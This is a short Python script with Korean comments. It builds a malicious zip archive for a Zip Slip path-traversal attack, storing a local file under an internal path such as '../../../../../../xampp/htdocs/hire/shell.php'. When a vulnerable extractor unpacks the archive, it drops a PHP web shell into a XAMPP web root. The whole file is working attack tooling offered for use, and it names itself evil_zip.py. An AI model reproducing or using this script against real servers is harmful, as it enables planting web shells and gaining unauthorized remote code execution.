import zipfile, os, sys

# --- 사용법 ---
# python create_zip.py [로컬 파일] [zip안에 넣을 경로] [만들 zip 이름]
# 예시:
# python create_zip.py shell.php ../../../../../../xampp/htdocs/hire/shell.php evil_v2.zip

if len(sys.argv) != 4:
    print("Usage: python evil_zip.py [local_file] [internal_path] [output_zip]")
    print("Example: python evil_zip.py shell.php ../../../../../../xampp/htdocs/shell.php evil.zip")
    sys.exit(1)

local_file = sys.argv[1]
internal_path = sys.argv[2]
output_zip = sys.argv[3]

if not os.path.exists(local_file):
    print(f"Error: 로컬 파일 '{local_file}' 없음.")
    sys.exit(1)

try:
    zf = zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED)
    
    zinfo = zipfile.ZipInfo(internal_path)
    zinfo.compress_type = zipfile.ZIP_DEFLATED
    zinfo.create_system = 3 
    zinfo.external_attr = 0o100644 << 16 

    with open(local_file, 'rb') as f:
        file_content = f.read()

    zf.writestr(zinfo, file_content)
    zf.close()

    print(f"'{output_zip}' 생성.  (내부 경로: '{internal_path}')")

except Exception as e:
    print(f"에러: {e}")
